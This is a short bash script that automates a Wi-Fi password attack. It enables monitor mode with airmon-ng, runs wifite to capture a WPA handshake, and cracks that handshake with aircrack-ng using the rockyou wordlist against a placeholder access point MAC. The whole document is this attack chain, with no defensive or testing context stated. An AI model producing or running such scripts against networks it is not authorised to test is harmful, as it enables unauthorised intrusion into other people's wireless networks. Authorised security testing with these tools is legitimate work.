#!/bin/bash
# Script to automate Wi-Fi handshake capture and cracking.

echo "Starting monitor mode..."
sudo airmon-ng start wlan0

echo "Running Wifite to capture handshake..."
sudo wifite

echo "Cracking handshake with Aircrack-ng..."
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <AP_MAC> handshake.cap
